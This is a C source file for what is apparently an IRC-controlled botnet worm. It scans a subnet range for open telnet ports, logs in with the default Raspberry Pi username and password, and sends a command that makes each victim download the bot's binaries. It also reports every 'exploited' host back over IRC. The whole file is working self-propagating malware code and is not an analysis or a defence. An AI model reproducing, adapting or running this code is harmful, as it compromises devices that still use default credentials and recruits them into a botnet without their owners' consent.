#include "../header/header.h"


int scan_subnetwork(irc_info *info, int class_a, int class_b, int class_c) {

	if (!class_a) {

		char *subnet = get_subnet_address();

		if (subnet) {

			// get first octect
			char *fo = strtok(subnet, ".");
			// second... and third
			char *so = strtok(NULL, ".");
			char *to = strtok(NULL, ".");

			char msg[50];

			for (int i = 100; i < 200; i++) {
				//sprintf(msg, "scanning %s.%s.%s.%d\n", fo, so, to, i);
				//irc_send(msg, strlen(msg), info);

				telnet_info info_t;
				sprintf(info_t.ip, "%s.%s.%s.%d", fo, so, to, i);

				if (!telnet_connect(&info_t)) {
					sprintf(msg, "connected to %s\n", info_t.ip);
					irc_send(msg, strlen(msg), info);
					sprintf(msg, "trying to exploit %s\n", info_t.ip);
					irc_send(msg, strlen(msg), info);

					if (!telnet_login(&info_t)) {
						sprintf(msg, "exploited %s\n", info_t.ip);
						irc_send(msg, strlen(msg), info);
					}
				}
			}
		} else {
			return EXIT_FAILURE;
		}

	} else {

		char msg[50];

		for (int i = 100; i < 200; i++) {

			telnet_info info_t;
			sprintf(info_t.ip, "%d.%d.%d.%d", class_a, class_b, class_c, i);

			if (!telnet_connect(&info_t)) {
				irc_send(info_t.ip, strlen(info_t.ip), info);
				sprintf(msg, "trying to exploit %s\n", info_t.ip);
				irc_send(msg, strlen(msg), info);

				if (!telnet_login(&info_t)) {
					sprintf(msg, "exploited %s\n", info_t.ip);
					irc_send(msg, strlen(msg), info);
				}
			}
		}
	}
}

char * get_subnet_address() {

	// getting our address in the subnetwork
	struct ifaddrs *ifaddr, *ifa;
	char *host = calloc(1, NI_MAXHOST);

	// try to get interface address
	if (getifaddrs(&ifaddr) == -1) {
		perror("getifaddr");
		return NULL;
	}

	int n;
	// walk through interfaces
	for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++) {

		if (ifa->ifa_addr == NULL)
			continue;

		// we'll skip interfaces that are not IPv4
		if (ifa->ifa_addr->sa_family != AF_INET) continue;
		if (getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST) != 0) {
			perror("getnameinfo");
			return NULL;
		}

		//if (host)
		//	break;
	}

	freeifaddrs(ifaddr);

	if (!host) {
		free(host);
		return NULL;
	}
	return host;
}


int telnet_connect(telnet_info *info) {

	struct sockaddr_in *addr;
	int fd;

	addr = calloc(1, sizeof(struct sockaddr_in));
	//memset(addr, 0, sizeof(struct sockaddr_in));
	addr->sin_family = AF_INET;
	addr->sin_addr.s_addr = inet_addr(info->ip);
	addr->sin_port = htons(TELNET_PORT);

	if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		perror("socket telnet connect");
		return EXIT_FAILURE;
	}

	if (connect(fd, (struct sockaddr *) addr, sizeof(struct sockaddr_in)) == -1) {
		perror("connect telnet connect");
		return EXIT_FAILURE;
	}
	free(addr);

	info->fd_telnet = fd;

	return EXIT_SUCCESS;
}

int telnet_login(telnet_info *info) {

	char *buf;
	char *last_read;

	bool logged = false;
	bool wait_pass = false;

	terminal_set(info->fd_telnet);

	last_read = calloc(1, MAX_BUF);
	buf = malloc(MAX_BUF + 1);

	while (1) {
		struct timeval ts;
		ts.tv_sec = 1;
		ts.tv_usec = 0;

		int nfds = info->fd_telnet + 1;
		fd_set write_set;
		fd_set read_set;

		FD_ZERO(&write_set);
		FD_ZERO(&read_set);

		FD_SET(info->fd_telnet, &write_set);
		FD_SET(info->fd_telnet, &read_set);

		int ready = select(nfds, &read_set, &write_set, NULL, &ts);
		if (FD_ISSET(info->fd_telnet, &read_set)) {

			int num_read = read(info->fd_telnet, buf, MAX_BUF - 1);
			buf[num_read] = '\0';

			strncpy(last_read, buf, num_read);

			//printf("%s", buf);
			write(STDOUT_FILENO, buf, num_read);
			fflush(stdout);

			// check if we've a prompt
			if (strstr(buf, "#") || strstr(buf, "~") || strstr(buf, "$")) {
				logged = true;
				wait_pass = false;
				//return EXIT_SUCCESS;
			}
		       sleep(1);
		}

		if (FD_ISSET(info->fd_telnet, &write_set)) {

			if (!last_read) continue;
			//if (wait_pass) continue;

			if (logged) {
				send_download_command(info->fd_telnet);
				return EXIT_SUCCESS;

			} else if (strcasestr(last_read, "login") && !wait_pass) {
				// trying username
				write(info->fd_telnet, "pi\n", 3);
				wait_pass = true;
			}
			if (strcasestr(last_read, "Password")) {
				write(info->fd_telnet, "raspberry\r\n", 10);
				wait_pass = true;
			}
			sleep(1);
			last_read[0] = '\0';
		}
	}
}

void send_download_command(int fd_telnet) {
	char db[strlen(DOWNLOAD_BINARIES) + 2];
	sprintf(db, "%s\n", DOWNLOAD_BINARIES);
	write(fd_telnet, db, strlen(db) + 1);
}

void terminal_set(int telnet_fd) {

	struct termios term;

	tcgetattr(telnet_fd, &term);
	cfmakeraw(&term);
       	tcsetattr(telnet_fd, TCSANOW, &term);

}
